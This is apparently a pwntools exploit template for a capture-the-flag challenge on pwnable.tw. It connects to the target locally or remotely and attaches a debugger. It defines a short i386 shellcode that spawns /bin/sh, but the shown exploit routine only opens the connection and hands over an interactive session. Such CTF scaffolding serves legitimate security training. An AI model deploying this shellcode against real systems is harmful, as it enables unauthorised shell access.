from pwn import *
import sys,getopt
import time


args = sys.argv[1:]
context(os='linux', arch='i386')
debug = 1 if '-nd' not in args else 0

proc_name = './pwn' # dont omit ./ 
local = 1 if '-r' not in args else 0
isattach = local & 1
bps = isattach & 1
#socat TCP4-LISTEN:10001,fork EXEC:./pwn1
ip = 'chall.pwnable.tw'
port = 10000
io = None
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def ra():
    return io.recvall()
def sl(data):
	return io.sendline(data)
def sd(data):
	return io.send(data)
def rl():
	return io.recvline()
def sa(d,data):
    return io.sendlineafter(d,data)
def attach():
    log.info('attach' + str(attach))
    if isattach:
        if bps:
            gdb.attach(pidof(io)[0], open('bps'))
        else:
            gdb.attach(pidof(io)[0])
    

def pwn():
    makeio()
    attach()
    if debug:
        context.log_level = 'debug'
    
    io.interactive()


if __name__ == '__main__':
	pwn()

